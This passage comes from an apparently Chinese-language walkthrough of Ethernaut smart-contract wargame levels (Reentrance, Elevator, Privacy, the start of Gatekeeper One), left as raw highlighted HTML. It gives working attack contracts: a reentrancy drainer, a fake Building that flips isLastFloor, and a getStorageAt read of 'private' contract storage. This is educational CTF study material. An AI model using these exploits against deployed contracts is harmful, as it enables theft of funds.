class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tryMod</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked </span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">/</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked </span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">&lt;=</span> a<span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked </span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> a <span class=\"token operator\">/</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> b<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// unchecked</span>\n         <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>写攻击合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span><span class=\"token punctuation\">{</span>\n  Reentrance <span class=\"token keyword\">public</span> aim<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> aimAddr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n    aim<span class=\"token operator\">=</span><span class=\"token function\">Reentrance</span><span class=\"token punctuation\">(</span>aimAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n      aim<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n      aim<span class=\"token punctuation\">.</span>donate<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    aim<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span><span class=\"token punctuation\">{</span>\n    aim<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>attackamout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/9A1mVG8utv6aobZ.png\" alt=\"image-20230125151538042.png\"></p>\n<h2 id=\"12-Elevator\"><a href=\"#12-Elevator\" class=\"headerlink\" title=\"12.Elevator\"></a>12.Elevator</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Building</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Elevator</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> top<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> floor<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _floor<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    Building building <span class=\"token operator\">=</span> <span class=\"token function\">Building</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>_floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      floor <span class=\"token operator\">=</span> _floor<span class=\"token punctuation\">;</span>\n      top <span class=\"token operator\">=</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>题目要求使top为true，但是读题发现在goTo那个函数怎么也没办法实现</p>\n<p><code>Building building = Building(msg.sender);</code></p>\n<p>这里的<code>msg.sender</code>需要传入一个外部合约，可以自由编写恶意操控</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span><span class=\"token punctuation\">{</span>\n   Elevator <span class=\"token keyword\">public</span> build<span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> aim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n     build<span class=\"token operator\">=</span><span class=\"token function\">Elevator</span><span class=\"token punctuation\">(</span>aim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n  <span class=\"token builtin\">bool</span> result <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      result<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n      result<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> \n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    build<span class=\"token punctuation\">.</span><span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/7w2rY5AkH9Ejzdy.png\" alt=\"image-20230125162526911.png\"></p>\n<h2 id=\"13-Privacy\"><a href=\"#13-Privacy\" class=\"headerlink\" title=\"13.Privacy\"></a>13.Privacy</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Privacy</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> ID <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">private</span> flattening <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">private</span> denomination <span class=\"token operator\">=</span> <span class=\"token number\">255</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint16</span> <span class=\"token keyword\">private</span> awkwardness <span class=\"token operator\">=</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> data<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    data <span class=\"token operator\">=</span> _data<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes16</span> _key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_key <span class=\"token operator\">==</span> <span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">/*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>说是可以参考Vault那题，先说说查看反编译内容的方法</p>\n<h3 id=\"查看反编译内容\"><a href=\"#查看反编译内容\" class=\"headerlink\" title=\"查看反编译内容\"></a>查看反编译内容</h3><p>要在<code>Etherscan</code>上面查看</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/enO6GAh18EVj3yH.png\" alt=\"image-20230125163647495.png\"></p>\n<p><img src=\"https://s2.loli.net/2023/03/24/4aAUe6PkoEcxSGp.png\" alt=\"image-20230125163705817.png\"></p>\n<h3 id=\"状态变量在存储中的布局\"><a href=\"#状态变量在存储中的布局\" class=\"headerlink\" title=\"状态变量在存储中的布局\"></a>状态变量在存储中的布局</h3><h3 id=\"（https-learnblockchain-cn-docs-solidity-internals-layout-in-storage-html）\"><a href=\"#（https-learnblockchain-cn-docs-solidity-internals-layout-in-storage-html）\" class=\"headerlink\" title=\"（https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）\"></a>（<a href=\"https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）\">https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）</a></h3><p>除了动态大小的数组和映射<code>(mapping)</code>，数据的存储方式是从位置<code>0</code>开始连续放置在存储中</p>\n<p>存储大小<strong>少于</strong>32字节的多个变量会被打包到一个<strong>存储插槽</strong><code>storage slot</code>中</p>\n<ul>\n<li>存储插槽的第一项会以低位对齐的方式储存</li>\n<li>值类型仅使用存储它们所需的字节</li>\n<li>如果存储插槽中的剩余空间不足以储存一个值类型，那么它会被存入下一个存储插槽</li>\n<li>结构体<code>struct</code>和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）</li>\n<li>结构体和数组之后的数据也或开启一个新插槽</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2023/03/24/gYtEjoUd8X4Zz9P.png\" alt=\"image-20230125170112017.png\"></p>\n<p>回看题目，stor0是locked，stor1是ID</p>\n<p>那么这里的stor5就相当于_key（这边有点不太理解）</p>\n<p>利用<code>await web3.eth.getStorageAt(\"0x1D5ddFb5Ce911FEED9B0C5514aD7E58f30b85132\",5)</code>来得到data[2]的值</p>\n<p>再用<code>\"0x7b9b6db4bb8f1de0aa618ff30ca9aceb8cf77cd5700414981d7a13c0676304f1\".slice(0,34)</code>获得_key的值（为什么是34？为什么这样子操作没搞懂）</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/yHAZ1Gju2wzap4O.png\" alt=\"image-20230125171949295.png\"></p>\n<p>还有一种编写合约的方法</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/kO1oLBreqvw5EHJ.png\" alt=\"image-20230125172537475.png\"></p>\n<h2 id=\"14-Gatekeeper-One\"><a href=\"#14-Gatekeeper-One\" class=\"headerlink\" title=\"14.Gatekeeper One\"></a>14.Gatekeeper One</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperOne</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8191</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token 